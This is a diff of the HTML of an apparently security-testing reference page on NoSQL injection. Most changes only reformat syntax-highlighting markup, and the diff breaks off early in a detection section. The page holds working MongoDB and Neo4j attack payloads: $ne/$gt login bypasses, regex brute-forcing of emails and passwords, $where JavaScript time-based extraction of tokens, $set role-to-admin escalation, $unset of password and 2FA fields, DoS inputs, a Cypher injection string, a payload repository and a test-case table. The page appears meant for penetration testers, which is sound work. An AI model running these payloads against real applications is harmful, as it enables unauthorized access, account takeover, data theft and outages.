+login[$nin][]=admin&amp;login[$nin][]=test&amp;pass[$ne]=toto</code></pre></li>
 <li>
 <p>JSON data</p>
 <pre tabindex="0"><code>{&#34;username&#34;: {&#34;$ne&#34;: null}, &#34;password&#34;: {&#34;$ne&#34;: null}}
@@ -1532,103 +1485,60 @@ login[$nin][]=admin&amp;login[$nin][]=test&amp;pass[$ne]=toto
 {&#34;username&#34;: {&#34;$gt&#34;: undefined}, &#34;password&#34;: {&#34;$gt&#34;: undefined}}
 {&#34;username&#34;: {&#34;$gt&#34;:&#34;&#34;}, &#34;password&#34;: {&#34;$gt&#34;:&#34;&#34;}}
 {&#34;username&#34;: {&#34;$exists&#34;: true}, &#34;password&#34;: {&#34;$regex&#34;: &#34;.*&#34;}}
-{&#34;$or&#34;: [{&#34;user&#34;: &#34;admin&#34;}, {&#34;user&#34;: {&#34;$ne&#34;: null}}]}
-</code></pre></li>
+{&#34;$or&#34;: [{&#34;user&#34;: &#34;admin&#34;}, {&#34;user&#34;: {&#34;$ne&#34;: null}}]}</code></pre></li>
 </ul>
 <hr>
-<h3 id="2-data-extraction">
-  2. Data Extraction
-  <a class="anchor" href="#2-data-extraction">#</a>
-</h3>
+<h3 id="2-data-extraction">2. Data Extraction<a class="anchor" href="#2-data-extraction">#</a></h3>
 <p><strong>Blind via Regex Bruteforce</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;email&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^a&#34;</span>}}
-</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;email&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^admin.*@example\\\\.com&#34;</span>}}
-</span></span></code></pre></div><p><strong>Error-Based / Full Dump</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;user&#34;</span>: {<span style="color:#f92672">&#34;$gt&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>}}     <span style="color:#75715e">// Returns all users
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;age&#34;</span>: {<span style="color:#f92672">&#34;$lt&#34;</span>: <span style="color:#ae81ff">150</span>}}     <span style="color:#75715e">// Type probing
-</span></span></span></code></pre></div><hr>
-<h3 id="3-privilege-escalation">
-  3. Privilege Escalation
-  <a class="anchor" href="#3-privilege-escalation">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;email&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^a&#34;</span>}}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;email&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^admin.*@example\\\\.com&#34;</span>}}</span></span></code></pre></div><p><strong>Error-Based / Full Dump</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;user&#34;</span>: {<span style="color:#f92672">&#34;$gt&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>}}     <span style="color:#75715e">// Returns all users
+</span></span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;age&#34;</span>: {<span style="color:#f92672">&#34;$lt&#34;</span>: <span style="color:#ae81ff">150</span>}}     <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">Type</span> <span style="color:#960050;background-color:#1e0010">probing</span></span></span></code></pre></div><hr>
+<h3 id="3-privilege-escalation">3. Privilege Escalation<a class="anchor" href="#3-privilege-escalation">#</a></h3>
 <p><strong>Elevating User Roles or Creating Admins</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;attacker&#34;</span>, <span style="color:#f92672">&#34;$set&#34;</span>: {<span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>}}        <span style="color:#75715e">// MongoDB operator injection - updates role to admin
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;hacker&#34;</span>, <span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>, <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;backdoor&#34;</span>}  <span style="color:#75715e">// Direct privilege escalation - creates admin user with known password
-</span></span></span></code></pre></div><hr>
-<h3 id="4-denial-of-service-dos">
-  4. Denial of Service (DoS)
-  <a class="anchor" href="#4-denial-of-service-dos">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;attacker&#34;</span>, <span style="color:#f92672">&#34;$set&#34;</span>: {<span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>}}        <span style="color:#75715e">// MongoDB operator injection - updates role to admin
+</span></span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;hacker&#34;</span>, <span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>, <span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;backdoor&#34;</span>}  <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">Direct</span> <span style="color:#960050;background-color:#1e0010">privilege</span> <span style="color:#960050;background-color:#1e0010">escalation</span> <span style="color:#960050;background-color:#1e0010">-</span> <span style="color:#960050;background-color:#1e0010">creates</span> <span style="color:#960050;background-color:#1e0010">admin</span> <span style="color:#960050;background-color:#1e0010">user</span> <span style="color:#960050;background-color:#1e0010">with</span> <span style="color:#960050;background-color:#1e0010">known</span> <span style="color:#960050;background-color:#1e0010">password</span></span></span></code></pre></div><hr>
+<h3 id="4-denial-of-service-dos">4. Denial of Service (DoS)<a class="anchor" href="#4-denial-of-service-dos">#</a></h3>
 <p><strong>CPU / Infinite Loop</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$where&#34;</span>: <span style="color:#e6db74">&#34;while(true){}&#34;</span>}  <span style="color:#75715e">// MongoDB
-</span></span></span></code></pre></div><p><strong>Memory Exhaustion</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;id&#34;</span>: {<span style="color:#f92672">&#34;$in&#34;</span>: [<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#960050;background-color:#1e0010">...</span>,<span style="color:#ae81ff">100000</span>]}}  <span style="color:#75715e">// Massive $in array
-</span></span></span></code></pre></div><hr>
-<h3 id="5-remote-code-execution-rce">
-  5. Remote Code Execution (RCE)
-  <a class="anchor" href="#5-remote-code-execution-rce">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$where&#34;</span>: <span style="color:#e6db74">&#34;while(true){}&#34;</span>}  <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">MongoDB</span></span></span></code></pre></div><p><strong>Memory Exhaustion</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;id&#34;</span>: {<span style="color:#f92672">&#34;$in&#34;</span>: [<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#960050;background-color:#1e0010">...</span>,<span style="color:#ae81ff">100000</span>]}}  <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">Massive</span> <span style="color:#960050;background-color:#1e0010">$in</span> <span style="color:#960050;background-color:#1e0010">array</span></span></span></code></pre></div><hr>
+<h3 id="5-remote-code-execution-rce">5. Remote Code Execution (RCE)<a class="anchor" href="#5-remote-code-execution-rce">#</a></h3>
 <p>MongoDB Server-Side JavaScript Injection: Exploits $where operator which executes JavaScript on MongoDB server</p>
 <pre tabindex="0"><code>{&#34;$where&#34;: &#34;sleep(10000)&#34;}    // Time-based: 10 second delay confirms execution
 {&#34;$where&#34;: &#34;this.username == &#39;admin&#39; &amp;&amp; this.password.match(/.*/)&#34;}  // Boolean-based: extracts data via regex
-{&#34;$where&#34;: &#34;var date = new Date(); while(new Date() - date &lt; 5000){}&#34;}  // CPU-based time delay (5 seconds)
-</code></pre><p>Note: $where is deprecated in modern MongoDB versions but still found in legacy systems.</p>
+{&#34;$where&#34;: &#34;var date = new Date(); while(new Date() - date &lt; 5000){}&#34;}  // CPU-based time delay (5 seconds)</code></pre><p>Note: $where is deprecated in modern MongoDB versions but still found in legacy systems.</p>
 <hr>
-<h3 id="6-schema-manipulation--tampering">
-  6. Schema Manipulation &amp; Tampering
-  <a class="anchor" href="#6-schema-manipulation--tampering">#</a>
-</h3>
+<h3 id="6-schema-manipulation--tampering">6. Schema Manipulation &amp; Tampering<a class="anchor" href="#6-schema-manipulation--tampering">#</a></h3>
 <p><strong>Inject/Remove Fields</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;victim&#34;</span>, <span style="color:#f92672">&#34;isAdmin&#34;</span>: <span style="color:#66d9ef">true</span>}
-</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$unset&#34;</span>: {<span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>}}  <span style="color:#75715e">// Deletes password field
-</span></span></span></code></pre></div><hr>
-<h2 id="advance-attack-scenarios">
-  Advance Attack Scenarios
-  <a class="anchor" href="#advance-attack-scenarios">#</a>
-</h2>
-<h3 id="1-second-order-nosql-injection">
-  1. Second-Order NoSQL Injection
-  <a class="anchor" href="#1-second-order-nosql-injection">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;victim&#34;</span>, <span style="color:#f92672">&#34;isAdmin&#34;</span>: <span style="color:#66d9ef">true</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$unset&#34;</span>: {<span style="color:#f92672">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>}}  <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">Deletes</span> <span style="color:#960050;background-color:#1e0010">password</span> <span style="color:#960050;background-color:#1e0010">field</span></span></span></code></pre></div><hr>
+<h2 id="advance-attack-scenarios">Advance Attack Scenarios<a class="anchor" href="#advance-attack-scenarios">#</a></h2>
+<h3 id="1-second-order-nosql-injection">1. Second-Order NoSQL Injection<a class="anchor" href="#1-second-order-nosql-injection">#</a></h3>
 <p>Input is stored safely but injected into a query later when retrieved:</p>
 <ol>
 <li>Register a user with username: <code>{&quot;$gt&quot;: &quot;&quot;}</code> (stored as-is in the DB).</li>
 <li>Later, when the app queries: <code>db.users.find({username: &lt;stored_value&gt;})</code> — the stored operator activates.</li>
 </ol>
-<h3 id="2-mongodb-aggregation-pipeline-injection">
-  2. MongoDB Aggregation Pipeline Injection
-  <a class="anchor" href="#2-mongodb-aggregation-pipeline-injection">#</a>
-</h3>
+<h3 id="2-mongodb-aggregation-pipeline-injection">2. MongoDB Aggregation Pipeline Injection<a class="anchor" href="#2-mongodb-aggregation-pipeline-injection">#</a></h3>
 <p>If user input is embedded in a <code>$match</code> stage:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">db.collection.aggregate(</span>[
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">db.collection.aggregate(</span>[
 </span></span><span style="display:flex;"><span>  { <span style="color:#f92672">&#34;$match&#34;</span>: { <span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;&lt;USER_INPUT&gt;&#34;</span> } }
-</span></span><span style="display:flex;"><span>]<span style="color:#960050;background-color:#1e0010">)</span>
-</span></span></code></pre></div><p><strong>Payload:</strong> <code>{&quot;$ne&quot;: &quot;user&quot;}</code> → returns all non-user records.</p>
-<h3 id="3-graphql--mongodb-injection">
-  3. GraphQL + MongoDB Injection
-  <a class="anchor" href="#3-graphql--mongodb-injection">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>]<span style="color:#960050;background-color:#1e0010">)</span></span></span></code></pre></div><p><strong>Payload:</strong> <code>{&quot;$ne&quot;: &quot;user&quot;}</code> → returns all non-user records.</p>
+<h3 id="3-graphql--mongodb-injection">3. GraphQL + MongoDB Injection<a class="anchor" href="#3-graphql--mongodb-injection">#</a></h3>
 <p>GraphQL resolvers that pass arguments directly to MongoDB:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-graphql" data-lang="graphql"><span style="display:flex;"><span><span style="color:#66d9ef">query</span> {
-</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">user</span>(filter: <span style="color:#e6db74">&#34;{\&#34;role\&#34;:{\&#34;$ne\&#34;:\&#34;user\&#34;}}&#34;</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span> email role
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-graphql" data-lang="graphql"><span style="display:flex;"><span><span style="color:#66d9ef">query</span> {
+</span></span><span style="display:flex;"><span>  user(filter: <span style="color:#e6db74">&#34;{\&#34;role\&#34;:{\&#34;$ne\&#34;:\&#34;user\&#34;}}&#34;</span>) {
+</span></span><span style="display:flex;"><span>    name email role
 </span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h3 id="4-neo4j-database-graph-oriented-database">
-  4. Neo4j Database (graph-oriented database)
-  <a class="anchor" href="#4-neo4j-database-graph-oriented-database">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h3 id="4-neo4j-database-graph-oriented-database">4. Neo4j Database (graph-oriented database)<a class="anchor" href="#4-neo4j-database-graph-oriented-database">#</a></h3>
 <p><strong>Cypher Injections</strong></p>
 <p><code>query = f&quot;MATCH (m:Movie) WHERE toLower(m.title) CONTAINS toLower('{name}') RETURN m.title</code> AS title”</p>
 <p>For returning all records: // Check the below query, is ** the part of this query.</p>
 <p><code>query = f&quot;MATCH (m:Movie) WHERE toLower(m.title) CONTAINS toLower**('test') or 1=1 return m.title AS title**// RETURN m.title AS title&quot;</code></p>
 <p>Payload: <strong>test&rsquo;) or 1=1 return m.title AS title//</strong></p>
-<h2 id="payload-repository">
-  Payload Repository
-  <a class="anchor" href="#payload-repository">#</a>
-</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">// Fuzz Strings
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">$</span>
+<h2 id="payload-repository">Payload Repository<a class="anchor" href="#payload-repository">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">// Fuzz Strings
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\\</span>
@@ -1639,104 +1549,94 @@ login[$nin][]=admin&amp;login[$nin][]=test&amp;pass[$ne]=toto
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; &#34;</span> <span style="color:#960050;background-color:#1e0010">\\</span> <span style="color:#960050;background-color:#1e0010">;</span> { }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Auth Bypass
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;username&#34;</span>: {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#66d9ef">null</span>}, <span style="color:#f92672">&#34;password&#34;</span>: {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#66d9ef">null</span>}}
+</span></span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>: {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#66d9ef">null</span>}, <span style="color:#f92672">&#34;password&#34;</span>: {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#66d9ef">null</span>}}
 </span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$or&#34;</span>: [{<span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>}, {<span style="color:#f92672">&#34;role&#34;</span>: {<span style="color:#f92672">&#34;$ne&#34;</span>: <span style="color:#e6db74">&#34;user&#34;</span>}}]}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Regex Brute
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;email&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^a.*&#34;</span>}}
+</span></span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;email&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^a.*&#34;</span>}}
 </span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;password&#34;</span>: {<span style="color:#f92672">&#34;$regex&#34;</span>: <span style="color:#e6db74">&#34;^.{8,}$&#34;</span>}}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Time Based
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;$where&#34;</span>: <span style="color:#e6db74">&#34;sleep(5000)&#34;</span>}
+</span></span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$where&#34;</span>: <span style="color:#e6db74">&#34;sleep(5000)&#34;</span>}
 </span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$where&#34;</span>: <span style="color:#e6db74">&#34;function() { return true; }&#34;</span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Extracting Data with time delays
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;$where&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;if(this.token.startsWith(&#39;a&#39;)) {sleep(5000); return true;} else {return true;}&#34;</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;$where&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;if(this.token.startsWith(&#39;a&#39;)) {sleep(5000); return true;} else {return true;}&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// DoS
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;id&#34;</span>: {<span style="color:#f92672">&#34;$in&#34;</span>: [<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#960050;background-color:#1e0010">...</span><span style="color:#ae81ff">10000</span>]}}
+</span></span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;id&#34;</span>: {<span style="color:#f92672">&#34;$in&#34;</span>: [<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#960050;background-color:#1e0010">...</span><span style="color:#ae81ff">10000</span>]}}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Schema Abuse
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#f92672">&#34;$set&#34;</span>: {<span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>}}
+</span></span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$set&#34;</span>: {<span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>}}
 </span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;$unset&#34;</span>: {<span style="color:#f92672">&#34;2FA&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>}}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Javascript Execution
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">$where:</span> <span style="color:#960050;background-color:#1e0010">function()</span> { <span style="color:#75715e">//arbitrary JavaScript here }
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&#34;$where&#34;</span>:<span style="color:#e6db74">&#34;Object.keys(this)[0].match(&#39;^.{0}a.*&#39;)&#34;</span>  <span style="color:#75715e">// Extracting field names
-</span></span></span></code></pre></div><hr>
-<h2 id="test-cases">
-  Test Cases
-  <a class="anchor" href="#test-cases">#</a>
-</h2>
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$where:</span> <span style="color:#960050;background-color:#1e0010">function()</span> { <span style="color:#75715e">//arbitrary JavaScript here }
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&#34;$where&#34;</span>:<span style="color:#e6db74">&#34;Object.keys(this)[0].match(&#39;^.{0}a.*&#39;)&#34;</span>  <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">Extracting</span> <span style="color:#960050;background-color:#1e0010">field</span> <span style="color:#960050;background-color:#1e0010">names</span></span></span></code></pre></div><hr>
+<h2 id="test-cases">Test Cases<a class="anchor" href="#test-cases">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Scenario</th>
-<th>Payload</th>
-<th>Expected Outcome</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Auth bypass (URL-encoded)</td>
-<td><code>username[$ne]=x&amp;password[$ne]=x</code></td>
-<td>Login succeeds without valid credentials</td>
-</tr>
-<tr>
-<td>Auth bypass (JSON)</td>
-<td><code>{&quot;username&quot;:{&quot;$ne&quot;:null},&quot;password&quot;:{&quot;$ne&quot;:null}}</code></td>
-<td>Login succeeds</td>
-</tr>
-<tr>
-<td>OR logic bypass</td>
-<td><code>{&quot;$or&quot;:[{&quot;user&quot;:&quot;admin&quot;},{&quot;user&quot;:{&quot;$ne&quot;:null}}]}</code></td>
-<td>Returns admin user or all users</td>
-</tr>
-<tr>
-<td>Regex enumeration</td>
-<td><code>{&quot;email&quot;:{&quot;$regex&quot;:&quot;^a&quot;}}</code></td>
-<td>Response differs if field starts with &lsquo;a&rsquo;</td>
-</tr>
-<tr>
-<td>Time-based blind</td>
-<td><code>{&quot;$where&quot;:&quot;sleep(5000)&quot;}</code></td>
-<td>~5 second delay in response</td>
-</tr>
-<tr>
-<td>Field existence probe</td>
-<td><code>{&quot;SSN&quot;:{&quot;$exists&quot;:true}}</code></td>
-<td>Returns records that have SSN field</td>
-</tr>
-<tr>
-<td>DoS via large <code>$in</code></td>
-<td><code>{&quot;id&quot;:{&quot;$in&quot;:[1,2,...,100000]}}</code></td>
-<td>Server slowdown or timeout</td>
-</tr>
-<tr>
-<td>Schema tampering</td>
-<td><code>{&quot;$set&quot;:{&quot;role&quot;:&quot;admin&quot;}}</code></td>
-<td>User role elevated if update endpoint vulnerable</td>
-</tr>
-<tr>
-<td>Neo4j Cypher injection</td>
-<td><code>test') or 1=1 return m.title AS title//</code></td>
-<td>All records returned</td>
-</tr>
-<tr>
-<td>Regex length probe</td>
-<td><code>{&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{8}$&quot;}}</code></td>
-<td>Confirms password length = 8</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Scenario</th>
+					<th>Payload</th>
+					<th>Expected Outcome</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Auth bypass (URL-encoded)</td>
+					<td><code>username[$ne]=x&amp;password[$ne]=x</code></td>
+					<td>Login succeeds without valid credentials</td>
+			</tr>
+			<tr>
+					<td>Auth bypass (JSON)</td>
+					<td><code>{&quot;username&quot;:{&quot;$ne&quot;:null},&quot;password&quot;:{&quot;$ne&quot;:null}}</code></td>
+					<td>Login succeeds</td>
+			</tr>
+			<tr>
+					<td>OR logic bypass</td>
+					<td><code>{&quot;$or&quot;:[{&quot;user&quot;:&quot;admin&quot;},{&quot;user&quot;:{&quot;$ne&quot;:null}}]}</code></td>
+					<td>Returns admin user or all users</td>
+			</tr>
+			<tr>
+					<td>Regex enumeration</td>
+					<td><code>{&quot;email&quot;:{&quot;$regex&quot;:&quot;^a&quot;}}</code></td>
+					<td>Response differs if field starts with &lsquo;a&rsquo;</td>
+			</tr>
+			<tr>
+					<td>Time-based blind</td>
+					<td><code>{&quot;$where&quot;:&quot;sleep(5000)&quot;}</code></td>
+					<td>~5 second delay in response</td>
+			</tr>
+			<tr>
+					<td>Field existence probe</td>
+					<td><code>{&quot;SSN&quot;:{&quot;$exists&quot;:true}}</code></td>
+					<td>Returns records that have SSN field</td>
+			</tr>
+			<tr>
+					<td>DoS via large <code>$in</code></td>
+					<td><code>{&quot;id&quot;:{&quot;$in&quot;:[1,2,...,100000]}}</code></td>
+					<td>Server slowdown or timeout</td>
+			</tr>
+			<tr>
+					<td>Schema tampering</td>
+					<td><code>{&quot;$set&quot;:{&quot;role&quot;:&quot;admin&quot;}}</code></td>
+					<td>User role elevated if update endpoint vulnerable</td>
+			</tr>
+			<tr>
+					<td>Neo4j Cypher injection</td>
+					<td><code>test') or 1=1 return m.title AS title//</code></td>
+					<td>All records returned</td>
+			</tr>
+			<tr>
+					<td>Regex length probe</td>
+					<td><code>{&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{8}$&quot;}}</code></td>
+					<td>Confirms password length = 8</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="a-manual-detection">
-  A. Manual Detection
-  <a class="anchor" href="#a-manual-detection">#</a>
-</h3>
+<h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="a-manual-detection">A. Manual Detection<a class="anchor" href="#a-manual-detection">#</a></h3>
 <ol>
 <li><strong>Character fuzzing</strong> — Send <code>'</code>, <code>&quot;</code>, <code>{</code>, <code>}</code>, <code>;</code>, <code>$</code>, <code>\x00</code> in all input fields and observe errors, behavior changes, or timing differences.</li>
 <li><strong>Operator injection</strong> — Change <code>username=admin</code> to <code>username[$ne]=admin</code> in URL-encoded POST body. If login succeeds, injection is possible.</li>
@@ -1745,41 +1645,35 @@ login[$nin][]=admin&amp;login[$nin][]=test&amp;pass[$ne]=toto
 <li><strong>Time-based blind</strong> — Send <code>{&quot;$where&quot;: &quot;sleep(5000)&quot;}</code> and observe if response takes ~5 seconds.</li>
